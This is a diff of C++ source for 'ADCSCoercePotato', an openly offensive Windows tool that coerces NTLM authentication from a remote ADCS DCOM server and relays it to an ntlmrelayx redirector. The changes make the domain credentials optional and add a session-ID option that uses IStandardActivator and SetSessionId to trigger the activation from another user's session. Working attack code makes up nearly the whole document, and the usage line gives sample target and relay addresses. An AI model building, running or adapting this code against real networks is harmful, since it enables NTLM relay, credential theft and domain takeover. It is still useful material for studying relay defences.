@@ -15,9 +15,11 @@
 #include <stdio.h>
 #include <assert.h>
 #include <tchar.h>
+#include <cwchar>
 #include <WinSafer.h>
 
 #include "HTTPCrossProtocolRelay.h"
+#include "IStandardActivator_h.h"
 
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
@@ -34,15 +36,17 @@ wchar_t* wredir_ip=NULL;
 wchar_t* wredir_port=NULL;
 char dcom_port[12];
 char dcom_ip[17];
+
 wchar_t* username=NULL;
 wchar_t* password=NULL;
 wchar_t* domain=NULL;
 static const char VERSION[] = "0.1";
-int g_sessionID = 4;
+int g_sessionID = 1337;
 BOOL TEST_mode = FALSE;
 HANDLE elevated_token, duped_token;
 
 int PotatoAPI::newConnection;
+int Pwn(wchar_t* clsid, BOOL brute, int sessionid);
 wchar_t *processtype = NULL;
 wchar_t *processargs = NULL;
 wchar_t *processname = NULL;
@@ -89,9 +93,6 @@ void usage()
 	printf("ADCSCoercePotato\n- @decoder_it 2024\n\n", VERSION);
 
 	printf("Mandatory args: \n"
-		"-u Domain Username\n"
-		"-p password\n"
-		"-d Domain Name\n"
 		"-m <host or IP> remote DCOM (ADCS) server address\n"
 		"-k <IP> redirector where socat and ntlmrelayx is running\n"
 		
@@ -101,9 +102,10 @@ void usage()
 	printf("Optional args: \n"
 		"-n <port> HTTP port where redirector (ntlmrelayx) is listening, default:80\n"
 		"-l <port> local socket server port, default:9999\n"
-		"-c <clsid> default:{D99E6E74-FC88-11D0-B498-00A0C90312F3}"
-		
-		
+		"-c <clsid> default:{D99E6E74-FC88-11D0-B498-00A0C90312F3}\n"
+		"-u Domain Username\n"
+		"-p password\n"
+		"-d Domain Name\n"
 	);
 	printf("\n\n");
 	printf("Example: ADCSCoercePotato.exe -m 192.168.212.22 -k 192.168.1.88 -u myuser -p mypass -d mydomain.domain\n");
@@ -132,6 +134,7 @@ void ParseUsernameFromType3(char* ntlmType3, int ntlmType3Len) {
 	printf("[+] Got NTLM type 3 AUTH message from %S\\%S with hostname %S \n", domain, user, hostname);
 
 }
+
 
 
 PotatoAPI::PotatoAPI() {
@@ -181,7 +184,7 @@ int checkForNewConnection(SOCKET* ListenSocket, SOCKET* ClientSocket) {
 	return 0;
 }
 
-int PotatoAPI::triggerDCOM(void)
+int PotatoAPI::triggerDCOM(int sessionid)
 {
 	CoInitialize(nullptr);
 
@@ -217,38 +220,88 @@ int PotatoAPI::triggerDCOM(void)
 	ca.dwAuthzSvc = RPC_C_AUTHZ_NONE;
 	ca.dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
 	ca.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
-	COAUTHIDENTITY id = { 0 };
-	ca.pAuthIdentityData = &id;
-	id.User = (USHORT*)username;
-	id.UserLength = wcslen(username);
-	id.Password = (USHORT*)password;
-	id.PasswordLength = wcslen(password);;
-	id.Domain = (USHORT*)domain;
-	id.DomainLength = wcslen(domain);
-	id.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
+
+
+	if (username != NULL || password != NULL || domain != NULL) {
+		COAUTHIDENTITY id = { 0 };
+		ca.pAuthIdentityData = &id;
+		id.User = (USHORT*)username;
+		id.UserLength = wcslen(username);
+		id.Password = (USHORT*)password;
+		id.PasswordLength = wcslen(password);;
+		id.Domain = (USHORT*)domain;
+		id.DomainLength = wcslen(domain);
+		id.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
+	}
+	else 
+	{
+		wchar_t username[256] = { 0 };
+		DWORD size = sizeof(username);
+		GetUserNameW(username, &size);
+		printf("[*] Current user: %ws\n", username);
+	}
+
+
 
 	COSERVERINFO c = { 0 };
 	c.pwszName = wdcom_ip;
 	c.pAuthInfo = &ca;
 
+	SetConsoleOutputCP(CP_UTF8);
+
 	CoInitialize(0);
 	CoInitializeEx(0, COINIT_APARTMENTTHREADED);
 	CoInitializeSecurity(0, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
-	HRESULT status=0;
+	HRESULT status = 0;
 	std::string message = std::system_category().message(status);
 
-	
-	printf("[*] Calling CoGetInstanceFromIStorage with CLSID:%S on remote endpoint:%S\n", olestr, wdcom_ip);
+	if (g_sessionID == 1337)
+	{
+		printf("[*] Pwning from current user session\n");
 
-	status = CoGetInstanceFromIStorage(&c, &clsid, NULL, CLSCTX_REMOTE_SERVER, t, 1, qis);
-	
-	
-	if (status == CO_E_BAD_PATH)
-		printf("[!] Error. CLSID %S not found. Bad path to object.\n", clsid);
+		wprintf(L"[*] Calling CoGetInstanceFromIStorage with CLSID:%ws on remote endpoint:%ws\n", olestr, wdcom_ip);
+		
+		status = CoGetInstanceFromIStorage(&c, &clsid, NULL, CLSCTX_REMOTE_SERVER, t, 1, qis);
+
+
+		if (status == CO_E_BAD_PATH)
+			wprintf(L"[!] Error. CLSID %ws not found. Bad path to object.\n", olestr);
+		else
+		{
+			message = std::system_category().message(status);
+			//std::cout << "[*] Msg: " << message << std::endl;
+			printf("[*] Trigger DCOM status: 0x%x\n", status);
+		}
+
+		fflush(stdout);
+	}
 	else
-		printf("[*] Trigger DCOM status: 0x%x - %s\n", status, message.c_str());
-	
-	fflush(stdout);
+	{
+		printf("[*] Pwning from session %d\n", g_sessionID);
+		IStandardActivator* pComAct;
+		HRESULT r = CoCreateInstance(CLSID_ComActivator, NULL, CLSCTX_INPROC_SERVER, IID_IStandardActivator, (LPVOID*)&pComAct);
+		ISpecialSystemProperties* pSpecialProperties = NULL;
+
+		r = pComAct->QueryInterface(IID_ISpecialSystemProperties, (void**)&pSpecialProperties);
+
+		r = pSpecialProperties->SetSessionId(g_sessionID, 0, 1);
+
+		printf("[*] Spawning COM object in the session: %d\n", g_sessionID);
+		wprintf(L"[*] Calling StandardGetInstanceFromIStorage with CLSID:%ws\n", olestr);
+
+		HRESULT status = pComAct->StandardGetInstanceFromIStorage(&c, &clsid, NULL, CLSCTX_REMOTE_SERVER, t, 1, qis);
+		
+		if (status == CO_E_BAD_PATH)
+			printf("[!] Error. CLSID %S not found. Bad path to object.\n", olestr);
+		else
+		{
+			message = std::system_category().message(status);
+			//std::cout << "[*] Msg: " << message << std::endl;
+			printf("[*] Trigger DCOM status: 0x%x\n", status);
+		}
+		fflush(stdout);
+	}
+
 	return 0;
 }
 
@@ -393,8 +446,6 @@ void ExtractType3FromRpc(char* rpcPacket, int rpcPacketLen, char* ntlmType3, int
 	memcpy(ntlmType3, rpcPacket + ntlmIndex, *authLen);
 	*ntlmType3Len = (int)*authLen;
 	ParseUsernameFromType3(ntlmType3, *ntlmType3Len);
-
-
 }
 
 int PotatoAPI::startCOMListener(void) {
@@ -668,6 +719,12 @@ int wmain(int argc, wchar_t** argv)
 				olestr = argv[1];
 				break;
 
+			case 's':
+				++argv;
+				--argc;
+				g_sessionID = _wtoi(argv[1]);
+				printf("Initialized session id %d\n", g_sessionID);
+				break;
 			
 			case 'm':
 				++argv;
@@ -711,22 +768,21 @@ int wmain(int argc, wchar_t** argv)
 	{
 		wredir_port = L"80";
 	}
-	if(wdcom_ip == NULL || wredir_ip==NULL ||domain==NULL || username==NULL || password==NULL)
-
-	
+	if(wdcom_ip == NULL || wredir_ip==NULL)
 	{
 		usage();
 		exit(-1);
 	}
 
-	// Fallback to default BITS CLSID
+	// Fallback to default CLSID Of CertSrv Request
 	if (olestr == NULL)
 		olestr = L"{D99E6E74-FC88-11D0-B498-00A0C90312F3}";
 
-	exit(Juicy(NULL, FALSE));
+	Pwn(NULL, FALSE, g_sessionID);
+	return 0;
 }
 
-int Juicy(wchar_t *clsid, BOOL brute)
+int Pwn(wchar_t *clsid, BOOL brute, int sessionid)
 {
 	PotatoAPI* test = new PotatoAPI();
 	test->startCOMListenerThread();
@@ -739,7 +795,7 @@ int Juicy(wchar_t *clsid, BOOL brute)
 
 
 	test->startRPCConnectionThread();
-	test->triggerDCOM();
+	test->triggerDCOM(sessionid);
 
 	
 	return 1;
